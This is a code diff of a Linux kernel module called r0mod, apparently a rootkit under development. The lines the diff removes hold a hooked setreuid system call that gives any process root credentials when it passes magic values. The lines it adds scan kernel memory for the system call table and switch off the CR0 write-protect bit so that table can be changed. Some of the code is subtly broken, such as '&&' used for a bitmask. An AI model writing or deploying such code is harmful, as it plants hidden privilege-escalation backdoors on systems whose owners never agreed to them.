@@ -20,172 +20,53 @@
 
 #include <r0mod/global.h>
 
-#define MAX_LEN     256
-#define PROC_V      "/proc/version"
-#define BOOT_PATH   "/boot/System.map-"
+#define SEARCH_START    PAGE_OFFSET
+#define SEARCH_END      ULONG_MAX
 
-int sys_found = 0;
+unsigned long cr0;
 unsigned long *syscall_table;
 
-asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
-
-asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
+unsigned long *find_sys_call_table(void)
 {
-    if((ruid == 1000) && (euid == 100))
+    unsigned long i;
+
+    for(i = SEARCH_START; i < SEARCH_END; i += sizeof(void *))
     {
-        printk(KERN_ALERT "[Correct]\n");
+        unsigned long *sys_call_table = (unsigned long *)i;
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,29)
-        current->uid = current->gid = 0;
-        current->euid = current->egid = 0;
-        current->suid = current->sgid = 0;
-        current->fsuid = current->fsgid = 0;
-#else
-        commit_creds(0);
-#endif
-
-        return orig_setreuid(0, 0);
+        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
+            return sys_call_table;
     }
 
-    return orig_setreuid(ruid, euid);
+    return NULL;
 }
 
-char *search_file(char *buf)
+static inline void disable_wp(unsigned long cr0)
 {
-    char *ver;
-
-    struct file *f;
-
-    mm_segment_t oldfs;
-
-    oldfs = get_fs();
-    set_fs(KERNEL_DS);
-
-    f = filp_open(PROC_V, O_RDONLY, 0);
-    if(IS_ERR(f) || (f == NULL))
-        return NULL;
-
-    memset(buf, 0, MAX_LEN);
-
-    vfs_read(f, buf, MAX_LEN, &f->f_pos);
-
-    ver = strsep((char**)&buf, " ");
-    ver = strsep((char**)&buf, " ");
-    ver = strsep((char**)&buf, " ");
-
-    filp_close(f, 0);
-    set_fs(oldfs);
-
-    return ver;
+    write_cr0(cr0 & ~0x00010000);
 }
 
-static int find_sys_call_table(char *kern_ver)
+static inline void restore_wp(unsigned long cr0)
 {
-    int i = 0;
-    char buf[MAX_LEN];
-    char *p, *filename;
-
-    struct file *f = NULL;
-
-    mm_segment_t oldfs;
-
-    oldfs = get_fs();
-    set_fs(KERNEL_DS);
-
-    filename = kmalloc(strlen(kern_ver) + strlen(BOOT_PATH) + 1, GFP_KERNEL);
-    if(filename == NULL)
-        return -1;
-
-    memset(filename, 0, strlen(BOOT_PATH) + strlen(kern_ver) + 1);
-    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
-    strncat(filename, kern_ver, strlen(kern_ver));
-    printk(KERN_ALERT "Path: %s", filename);
-
-    f = filp_open(filename, O_RDONLY, 0);
-    if(IS_ERR(f) || (f == NULL))
-        return -1;
-
-    memset(buf, 0, MAX_LEN);
-    p = buf;
-    while(vfs_read(f, p + i, 1, &f->f_pos) == 1)
-    {
-        if(p[i] == '\n' || i == 255)
-        {
-            i = 0;
-            if((strstr(p, "sys_call_table")) != NULL)
-            {
-                char *sys_string = kmalloc(MAX_LEN, GFP_KERNEL);
-
-                if(sys_string == NULL)
-                {
-                    filp_close(f, 0);
-                    set_fs(oldfs);
-                    kfree(filename);
-
-                    return -1;
-                }
-
-                memset(sys_string, 0, MAX_LEN);
-                strncpy(sys_string, strsep((char**)&p, " "), MAX_LEN);
-
-                syscall_table = (unsigned long *)simple_strtoll(sys_string, NULL, 16);
-
-                kfree(sys_string);
-
-                break;
-            }
-
-            memset(buf, 0, MAX_LEN);
-            continue;
-        }
-
-        i++;
-    }
-
-    filp_close(f, 0);
-    set_fs(oldfs);
-
-    kfree(filename);
-
-    return 0;
+    write_cr0(cr0);
 }
 
 static int __init r0mod_init(void)
 {
-    char *buf, *kern_ver;
-
     printk("Module starting...");
 
-    buf = kmalloc(MAX_LEN, GFP_KERNEL);
-    if(buf == NULL)
+    disable_wp(cr0);
+
+    syscall_table = find_sys_call_table();
+    if(syscall_table == NULL)
     {
-        sys_found = 1;
-        return -1;
+        printk("syscall_table addr = NULL");
+        return 1;
     }
 
-    kern_ver = search_file(buf);
-    if(kern_ver == NULL)
-    {
-        sys_found = 1;
-        return -1;
-    }
+    printk("syscall_table addr = %lx", (unsigned long)syscall_table);
 
-    printk(KERN_ALERT "Kernel version found: %s", kern_ver);
-
-    if(find_sys_call_table(kern_ver) == -1)
-    {
-        sys_found = 1;
-        return -1;
-    }
-
-    sys_found = 0;
-
-    write_cr0(read_cr0() && (~0x10000));
-    orig_setreuid = syscall_table[__NR_setreuid];
-    //syscall_table[__NR_setreuid] = new_setreuid;
-    write_cr0(read_cr0() | 0x10000);
-
-    kfree(buf);
+    restore_wp(cr0);
 
     return 0;
 }
@@ -195,12 +76,7 @@ static void __exit r0mod_exit(void)
 {
     printk("Module ending...");
 
-    if(sys_found == 0)
-    {
-        write_cr0(read_cr0() && (~0x10000));
-        syscall_table[__NR_setreuid] = orig_setreuid;
-        write_cr0(read_cr0() | 0x10000);
-    }
+
 }
 
 MODULE_LICENSE("GPL");
